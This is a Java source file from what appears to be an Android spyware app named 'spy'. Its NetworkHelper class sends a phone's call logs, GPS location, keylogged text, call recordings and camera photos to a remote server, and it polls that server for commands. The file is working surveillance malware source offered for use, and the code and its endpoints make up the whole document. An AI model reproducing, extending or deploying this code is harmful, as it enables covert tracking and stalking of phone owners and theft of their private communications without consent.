package com.gauravhanna.spy;

import android.content.Context;
import android.content.SharedPreferences;
import android.location.Location;
import android.util.Log;
import com.google.gson.Gson;
import okhttp3.*;
import org.json.JSONObject;
import java.io.IOException;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class NetworkHelper {
    private static final String TAG = "NetworkHelper";
    private static final String BASE_URL = "https://gauravhanna-spy.onrender.com";  // ✅ Render URL
    private static final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();
    private static Gson gson = new Gson();

    // Device ID stored in SharedPreferences
    private static String getDeviceId(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE);
        return prefs.getString("device_id", null);
    }

    private static void setDeviceId(Context context, String id) {
        SharedPreferences prefs = context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE);
        prefs.edit().putString("device_id", id).apply();
    }

    // Register device (call once)
    public static void registerDevice(Context context, String deviceId, String deviceName, String model, String androidVersion, String userId) {
        RequestBody body = RequestBody.create(MediaType.parse("application/json"),
                "{\"deviceId\":\"" + deviceId + "\",\"deviceName\":\"" + deviceName + "\",\"deviceModel\":\"" + model + "\",\"androidVersion\":\"" + androidVersion + "\",\"userId\":\"" + userId + "\"}");
        Request request = new Request.Builder()
                .url(BASE_URL + "/register")
                .post(body)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    // Parse response to get server device id
                    // For simplicity, we assume deviceId is same
                }
            }
        });
    }

    // Send calls
    public static void sendCalls(Context context, List<DataCollector.CallLogEntry> calls) {
        String deviceId = getDeviceId(context);
        if (deviceId == null) return;
        String json = gson.toJson(calls);
        RequestBody body = RequestBody.create(MediaType.parse("application/json"),
                "{\"deviceId\":\"" + deviceId + "\",\"calls\":" + json + "}");
        Request request = new Request.Builder()
                .url(BASE_URL + "/calls")
                .post(body)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close();
            }
        });
    }

    // Send SMS
    public static void sendSMS(Context context, List<DataCollector.SmsEntry> smsList) {
        // similar (implement as needed)
    }

    // Send contacts
    public static void sendContacts(Context context, List<DataCollector.ContactEntry> contacts) {
        // similar (implement as needed)
    }

    // Send location
    public static void sendLocation(Context context, Location location) {
        String deviceId = getDeviceId(context);
        if (deviceId == null) return;
        String json = "{\"deviceId\":\"" + deviceId + "\",\"lat\":" + location.getLatitude() + ",\"lng\":" + location.getLongitude() + ",\"speed\":" + location.getSpeed() + "}";
        RequestBody body = RequestBody.create(MediaType.parse("application/json"), json);
        Request request = new Request.Builder()
                .url(BASE_URL + "/location")
                .post(body)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close();
            }
        });
    }

    // Send keylog
    public static void sendKeylog(Context context, String appPackage, String text) {
        String deviceId = getDeviceId(context);
        if (deviceId == null) return;
        String json = "{\"deviceId\":\"" + deviceId + "\",\"appPackage\":\"" + appPackage + "\",\"text\":\"" + text.replace("\"", "\\\"") + "\"}";
        RequestBody body = RequestBody.create(MediaType.parse("application/json"), json);
        Request request = new Request.Builder()
                .url(BASE_URL + "/keylog")
                .post(body)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { e.printStackTrace(); }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close();
            }
        });
    }

    // ✅ NEW: Send call recording (audio base64)
    public static void sendRecording(Context context, String callId, String audioBase64, int duration) {
        String deviceId = getDeviceId(context);
        if (deviceId == null) return;
        try {
            JSONObject json = new JSONObject();
            json.put("deviceId", deviceId);
            if (callId != null) json.put("callId", callId);
            json.put("audioBase64", audioBase64);
            json.put("duration", duration);
            json.put("timestamp", System.currentTimeMillis());

            RequestBody body = RequestBody.create(MediaType.parse("application/json"), json.toString());
            Request request = new Request.Builder()
                    .url(BASE_URL + "/call-recording")
                    .post(body)
                    .build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) { e.printStackTrace(); }
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== NEW LIVE CAMERA METHODS ==========
    // ✅ Send photo (base64)
    public static void sendPhoto(Context context, String base64) {
        String deviceId = getDeviceId(context);
        if (deviceId == null) return;
        try {
            JSONObject json = new JSONObject();
            json.put("deviceId", deviceId);
            json.put("imageBase64", base64);
            RequestBody body = RequestBody.create(MediaType.parse("application/json"), json.toString());
            Request request = new Request.Builder()
                    .url(BASE_URL + "/photo")
                    .post(body)
                    .build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "sendPhoto failed: " + e.getMessage());
                }
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ✅ Interface for command callback
    public interface CommandCallback {
        void onCommand(String command);
    }

    // ✅ Get pending command from server
    public static void getCommand(Context context, String deviceId, CommandCallback callback) {
        Request request = new Request.Builder()
                .url(BASE_URL + "/command/" + deviceId)
                .get()
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "getCommand failed: " + e.getMessage());
                callback.onCommand("none");
            }
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String command = "none";
                try {
                    String json = response.body().string();
                    JSONObject obj = new JSONObject(json);
                    command = obj.optString("command", "none");
                } catch (Exception e) {
                    e.printStackTrace();
                }
                callback.onCommand(command);
                response.close();
            }
        });
    }
}